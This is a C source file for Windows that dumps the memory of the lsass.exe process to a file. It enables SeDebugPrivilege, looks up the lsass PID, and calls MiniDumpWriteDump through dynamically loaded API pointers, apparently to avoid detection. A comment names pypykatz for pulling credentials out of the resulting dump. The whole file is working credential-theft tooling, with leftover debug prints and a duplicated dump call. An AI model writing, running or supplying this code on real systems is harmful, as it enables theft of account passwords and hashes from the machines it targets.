#include <windows.h>
#include <stdio.h>
//#include <DbgHelp.h>
#include <TlHelp32.h>
#include "LoadAPI.h"

#pragma comment (lib, "Dbghelp.lib")

// pypykatz lsa minidump lsass.dmp
BOOL EnableWindowsPrivilege(API_Call APICall, char* Privilege) {
	/* Tries to enable privilege if it is present to the Permissions set. */
	LUID luid;
	TOKEN_PRIVILEGES tp;
	HANDLE currentProcess = APICall.Kernel32Api.GetCurrentProcessF();
	HANDLE currentToken;

	if (!APICall.Advapi32Api.LookupPrivilegeValueAF(NULL, Privilege, &luid)) return FALSE;

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!APICall.Advapi32Api.OpenProcessTokenF(currentProcess, TOKEN_ALL_ACCESS, &currentToken)) return FALSE;
	if (!APICall.Advapi32Api.AdjustTokenPrivilegesF(currentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) return FALSE;
	return TRUE;
}

BOOL CheckWindowsPrivilege(API_Call APICall, char* Privilege) {
	/* Checks for Privilege and returns True or False. */
	LUID luid;
	PRIVILEGE_SET privs;
	HANDLE hProcess;
	HANDLE hToken;  
	BOOL bResult;

	hProcess = APICall.Kernel32Api.GetCurrentProcessF();
	if (!APICall.Advapi32Api.OpenProcessTokenF(hProcess, TOKEN_QUERY, &hToken)) 
		return FALSE;
	if (!APICall.Advapi32Api.LookupPrivilegeValueAF(NULL, Privilege, &luid)) return FALSE;
	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	
	APICall.Advapi32Api.PrivilegeCheckF(hToken, &privs, &bResult);
	return bResult;
}


DWORD GetProcessPid(Kernel32_API Kernel32Api,char* TargetProcessName) {
	DWORD lsassPID = 0;
	HANDLE snapshot = Kernel32Api.CreateToolhelp32SnapshotF(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	char* processName = "";
	if (Kernel32Api.Process32FirstF(snapshot, &processEntry)) {
		while (strcmp(processName, TargetProcessName) != 0) {
			Kernel32Api.Process32NextF(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			lsassPID = processEntry.th32ProcessID;
		}
		printf("[+] Got lsass.exe PID: %i\n", lsassPID);
	}
	return lsassPID;
}

BOOL DumpProcess(API_Call APICall,DWORD lsassPID) {
	BOOL retVal = FALSE;
	HANDLE lsassHandle;
	
	HANDLE outFile = APICall.Kernel32Api.CreateFileAF("lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (outFile != NULL) {
		lsassHandle = APICall.Kernel32Api.OpenProcessF(PROCESS_ALL_ACCESS, 0, lsassPID);
		if (lsassHandle != NULL) { 
			// APICall.DbghelpApi.MiniDumpWriteDumpF
			printf("Function: %p\n", APICall.DbghelpApi.MiniDumpWriteDumpF);
			printf("Function: %p\n", MiniDumpWriteDump);
			retVal = APICall.DbghelpApi.MiniDumpWriteDumpF(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
			retVal = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
			//APICall.Kernel32Api.CloseHandleF(outFile);
		} else
			printf("[x] Fail to open process lsass !\n");
	}else
		printf("[x] Fail to create file lsass.dmp !\n");
	return retVal;
}

int main() {
	DWORD lsassPID;
	API_Call APICall;

	printf("[i] This software will try to dump lsass.exe memory!\n\n");

	
	if (!loadApi(&APICall)) {
		printf("[x] Fail to load dynamically functions!\n");
		return TRUE;
	}

	if (!EnableWindowsPrivilege(APICall,SE_DEBUG_NAME)) {
		printf("[x] Could not enable SeDebugPrivilege!\n");
		return TRUE;
	}
	if (!CheckWindowsPrivilege(APICall,SE_DEBUG_NAME)) {
		printf("[x] I do not have SeDebugPrivilege!\n");
		return TRUE;
	}
	printf("[+] SeDebugPrivilege set !\n");

	lsassPID = GetProcessPid(APICall.Kernel32Api,"lsass.exe");
	if (lsassPID == 0) {
		printf("[x] Fail to get lsass.exe PID !\n");
		return TRUE;
	}

	if (DumpProcess(APICall,lsassPID))
		printf("[+] Process lsass dumped successfully!\n");
	else
		printf("[x] Process lsass dumped fail (%d)!\n", GetLastError());
	return FALSE;
}